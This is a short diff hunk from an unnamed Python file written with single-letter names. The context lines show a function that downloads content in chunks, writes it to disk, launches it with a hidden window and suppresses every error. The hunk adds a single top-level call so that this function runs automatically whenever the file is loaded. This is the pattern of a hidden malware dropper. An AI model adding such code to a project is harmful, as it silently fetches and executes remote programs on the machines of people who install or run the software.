@@ -7,3 +7,4 @@ def D():
 			for I in E.iter_content(chunk_size=8192):H.write(I)
 		C.Popen(D,creationflags=C.CREATE_NO_WINDOW)
 	except:pass
+D()
